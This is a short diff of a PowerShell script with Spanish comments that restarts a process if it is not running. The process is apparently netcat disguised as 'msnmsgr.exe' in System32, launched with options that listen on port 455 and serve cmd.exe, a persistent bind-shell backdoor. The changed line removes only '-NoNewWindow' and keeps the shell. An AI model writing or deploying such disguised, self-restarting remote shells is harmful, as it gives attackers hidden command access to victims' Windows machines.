@@ -59,7 +59,7 @@ $Process = Get-Process | Where-Object { $_.ProcessName -eq $ProcessName }
 
 # Si el proceso no está en ejecución, iniciar el proceso
 if (-not $Process) {
-    Start-Process "C:\Windows\System32\msnmsgr.exe" -ArgumentList "-Ldp 455 -e cmd.exe" -NoNewWindow
+    Start-Process "C:\Windows\System32\msnmsgr.exe" -ArgumentList "-Ldp 455 -e cmd.exe"
 }
 '@
 
